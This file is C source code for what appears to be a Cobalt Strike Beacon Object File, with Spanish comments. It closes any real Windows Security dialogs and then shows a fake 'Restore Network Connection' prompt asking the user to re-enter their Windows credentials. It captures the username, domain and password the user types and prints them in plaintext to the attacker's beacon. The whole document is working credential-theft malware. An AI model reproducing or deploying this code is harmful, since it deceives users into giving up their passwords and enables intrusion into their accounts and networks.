#define SECURITY_WIN32 

#include <windows.h>
#include <wincred.h>
#include <security.h>
#include <shlwapi.h>

#include "Askcreds.h"
#include "beacon.h"

#define TIMEOUT 60
#define REASON L"Restore Network Connection"
#define MESSAGE L"Please verify your Windows user credentials to proceed."

// === VARIABLES GLOBALES PARA PASAR DATOS DEL HILO ===
WCHAR g_szUsername[MAXLEN] = {0};
WCHAR g_szPassword[MAXLEN] = {0};
WCHAR g_szDomain[MAXLEN] = {0};
DWORD g_dwCredResult = ERROR_CANCELLED;
BOOL  g_bCredDone = FALSE;

// === ENUMERAR Y CERRAR VENTANAS ===
BOOL CALLBACK EnumWindowsProc(HWND hWnd, LPARAM lParam) {
    CHAR chWindowTitle[1024];
    DWORD dwProcId = 0; 

    if (!hWnd || !USER32$IsWindowVisible(hWnd)) return TRUE;

    LONG_PTR lStyle = USER32$GetWindowLongPtrA(hWnd, GWL_STYLE);
    if (!USER32$GetWindowThreadProcessId(hWnd, &dwProcId)) return TRUE;

    MSVCRT$memset(chWindowTitle, 0, sizeof(chWindowTitle));
    if (!USER32$SendMessageA(hWnd, WM_GETTEXT, sizeof(chWindowTitle), (LPARAM)chWindowTitle)) return TRUE;

    if (MSVCRT$_stricmp(chWindowTitle, "Windows Security") == 0) {
        USER32$PostMessageA(hWnd, WM_CLOSE, 0, 0);
    }
    else if ((dwProcId == KERNEL32$GetCurrentProcessId()) && (WS_POPUPWINDOW == (lStyle & WS_POPUPWINDOW))) {
        USER32$PostMessageA(hWnd, WM_CLOSE, 0, 0);
    }
    else {
        WCHAR szFileName[MAX_PATH] = {0};
        DWORD dwSize = MAX_PATH;
        HANDLE hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcId);
        if (hProcess) {
            if (KERNEL32$QueryFullProcessImageNameW(hProcess, 0, szFileName, &dwSize)) {
                if (SHLWAPI$StrStrIW(szFileName, L"CredentialUIBroker.exe")) {
                    USER32$PostMessageA(hWnd, WM_CLOSE, 0, 0);
                }
            }
            KERNEL32$CloseHandle(hProcess);
        }
    }
    return TRUE;
}

// === HILO SECUNDARIO: SOLO LOGICA, SIN PRINTS ===
DWORD WINAPI AskCreds(LPVOID lpParameter) {
    LPCWSTR lpwReason = (LPCWSTR)lpParameter;
    DWORD dwRet = ERROR_CANCELLED;

    CREDUI_INFOW credUiInfo = {0};
    credUiInfo.cbSize = sizeof(credUiInfo);
    credUiInfo.pszCaptionText = lpwReason;
    credUiInfo.pszMessageText = MESSAGE;
    credUiInfo.hbmBanner = NULL;
    credUiInfo.hwndParent = USER32$GetForegroundWindow();

    DWORD authPackage = 0;
    WCHAR szUsername[MAXLEN] = {0};
    ULONG nSize = MAXLEN;
    LPVOID inCredBuffer = NULL, outCredBuffer = NULL;
    ULONG inCredSize = 0, outCredSize = 0;
    BOOL bSave = FALSE;

    // Obtener usuario actual
    if (!SECUR32$GetUserNameExW(NameSamCompatible, szUsername, &nSize)) {
        szUsername[0] = L'\0';
    }

    // Empaquetar credenciales vacías
    if (!CREDUI$CredPackAuthenticationBufferW(CRED_PACK_GENERIC_CREDENTIALS, szUsername, L"", NULL, &inCredSize) &&
        KERNEL32$GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
        inCredBuffer = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, inCredSize);
        if (inCredBuffer) {
            CREDUI$CredPackAuthenticationBufferW(CRED_PACK_GENERIC_CREDENTIALS, szUsername, L"", inCredBuffer, &inCredSize);
        }
    }

    // Mostrar diálogo
    dwRet = CREDUI$CredUIPromptForWindowsCredentialsW(
        &credUiInfo, 0, &authPackage,
        inCredBuffer, inCredSize,
        &outCredBuffer, &outCredSize,
        &bSave, CREDUIWIN_GENERIC | CREDUIWIN_CHECKBOX
    );

    // === GUARDAR RESULTADOS EN GLOBALES ===
    if (dwRet == ERROR_SUCCESS && outCredBuffer) {
        DWORD dwUser = MAXLEN, dwPass = MAXLEN, dwDomain = MAXLEN;
        if (CREDUI$CredUnPackAuthenticationBufferW(0, outCredBuffer, outCredSize,
            g_szUsername, &dwUser, g_szDomain, &dwDomain, g_szPassword, &dwPass)) {
            // Datos guardados
        }
    }

    g_dwCredResult = dwRet;

    // === LIMPIEZA ===
    if (inCredBuffer) {
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, inCredBuffer);
    }
    if (outCredBuffer) {
        MSVCRT$memset(outCredBuffer, 0, outCredSize);
        OLE32$CoTaskMemFree(outCredBuffer);
    }

    g_bCredDone = TRUE;
    return dwRet;
}

// === ENTRY POINT ===
VOID go(IN PCHAR Args, IN ULONG Length) {
    datap parser;
    BeaconDataParse(&parser, Args, Length);
    WCHAR wReason[256] = {0};
    LPCWSTR lpwReason = REASON;

    char* narrow = BeaconDataExtract(&parser, NULL);
    if (narrow && narrow[0]) {
        toWideChar(narrow, wReason, 256);
        lpwReason = wReason;
    }

    // Reiniciar estado
    g_bCredDone = FALSE;
    g_dwCredResult = ERROR_CANCELLED;
    g_szUsername[0] = g_szPassword[0] = g_szDomain[0] = L'\0';

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Mostrando prompt: %ls", lpwReason);

    // Limpiar ventanas previas
    USER32$EnumWindows(EnumWindowsProc, 0);

    // === LANZAR HILO ===
    HANDLE hThread = KERNEL32$CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)AskCreds, (LPVOID)lpwReason, 0, NULL);
    if (!hThread) {
        BeaconPrintf(CALLBACK_ERROR, "CreateThread failed.");
        return;
    }

    // === POLLING CON TIMEOUT (Sleep en principal = SEGURO) ===
    DWORD start = KERNEL32$GetTickCount();
    while ((KERNEL32$GetTickCount() - start) < (TIMEOUT * 1000)) {
        if (g_bCredDone) break;
        KERNEL32$Sleep(500);
    }

    // === TIMEOUT ===
    if (!g_bCredDone) {
        BeaconPrintf(CALLBACK_ERROR, "[TIMEOUT] Usuario no respondió. Cerrando ventana...");
        USER32$EnumWindows(EnumWindowsProc, 0);
        KERNEL32$TerminateThread(hThread, 1);
    } else {
        // === IMPRIMIR RESULTADOS (en hilo principal) ===
        if (g_dwCredResult == ERROR_SUCCESS) {
            if (g_szDomain[0] == L'\0') {
                char buf[1024];
                MSVCRT$sprintf(buf, "[+] Username: %ls\n[+] Password: %ls", g_szUsername, g_szPassword);
                BeaconPrintf(CALLBACK_OUTPUT, "%s", buf);
            } else {
                char buf[1024];
                MSVCRT$sprintf(buf, "[+] Username: %ls\n[+] Domain: %ls\n[+] Password: %ls", g_szUsername, g_szDomain, g_szPassword);
                BeaconPrintf(CALLBACK_OUTPUT, "%s", buf);
            }
        } else if (g_dwCredResult == ERROR_CANCELLED) {
            BeaconPrintf(CALLBACK_OUTPUT, "[-] Usuario canceló.");
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[-] Error: %d", g_dwCredResult);
        }
    }

    KERNEL32$CloseHandle(hThread);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] BOF finalizado.");
}